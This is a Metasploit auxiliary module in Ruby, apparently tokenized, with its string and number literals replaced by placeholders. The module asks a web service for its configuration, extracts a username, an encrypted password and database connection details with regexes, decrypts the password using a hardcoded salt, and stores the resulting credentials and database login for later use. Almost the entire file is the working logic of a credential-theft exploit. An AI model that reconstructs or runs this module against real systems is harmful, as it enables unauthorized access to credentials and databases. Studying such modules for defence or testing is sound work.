require <str> require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Auxiliary :: Report include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> ) ) register_options ( [ OptPort . new ( <str> , [ true , <str> , <int> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def decrypt_password ( ciphertext ) salt = [ - <int> , - <int> , - <int> , <int> , <int> , <int> , - <int> , <int> ] . pack ( <str> ) cipher = OpenSSL :: Cipher :: Cipher . new ( <str> ) base_64_code = Rex :: Text . decode_base64 ( ciphertext ) cipher . decrypt cipher . pkcs5_keyivgen <str> , salt , <int> plaintext = cipher . update base_64_code plaintext << cipher . final plaintext end def run begin res = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( datastore [ <str> ] , <str> ) , <str> = > { <str> = > <str> } , } ) rescue Rex :: ConnectionRefused fail_with ( Failure :: Unreachable , <str> peer <str> ) end if res && res . code == <int> && res . body . to_s . bytesize != <int> username = <str> . match ( res . body . to_s ) encrypted_password = <str> . match ( res . body . to_s ) database_url = <str> . match ( res . body . to_s ) database_type = <str> . match ( res . body . to_s ) unless username && encrypted_password && database_type && database_url fail_with ( Failure :: Unknown , <str> peer <str> ) end username = username . captures [ <int> ] encrypted_password = encrypted_password . captures [ <int> ] database_url = database_url . captures [ <int> ] database_type = database_type . captures [ <int> ] password = decrypt_password ( encrypted_password [ <int> .. encrypted_password . length ] ) credential_core = report_credential_core ( { <str> : password , <str> : username } ) matches = <str> . match ( database_url ) if matches begin if database_url [ <str> ] == <str> db_address = matches . captures [ <int> ] db_port = db_address [ ( db_address . index ( <str> ) + <int> ) .. ( db_address . length - <int> ) ] . to_i db_address = rhost else db_address = matches . captures [ <int> ] if db_address . index ( <str> ) db_address = db_address [ <int> , db_address . index ( <str> ) ] db_port = db_address [ db_address . index ( <str> ) .. ( db_address . length - <int> ) ] . to_i else db_port = <int> end db_address = Rex :: Socket . getaddress ( db_address , true ) end database_login_data = { <str> : db_address , <str> : database_type , <str> : <str> , <str> : db_port , <str> : myworkspace_id , <str> : credential_core , <str> : Metasploit :: Model :: Login :: Status :: UNTRIED } create_credential_login ( database_login_data ) rescue SocketError fail_with ( Failure :: Unknown , <str> ) end print_status ( <str> username <str> password <str> matches . captures [ <int> ] <str> ) return end else fail_with ( Failure :: NotVulnerable , <str> peer <str> res . code <str> ) end end def report_credential_core ( cred_opts = { } ) origin_service_data = { <str> : rhost , <str> : rport , <str> : ( ssl ? <str> : <str> ) , <str> : <str> , <str> : myworkspace_id } credential_data = { <str> : <str> , <str> : self . fullname , <str> : <str> , <str> : cred_opts [ <str> ] , <str> : cred_opts [ <str> ] } credential_data . merge! ( origin_service_data ) create_credential ( credential_data ) end end 
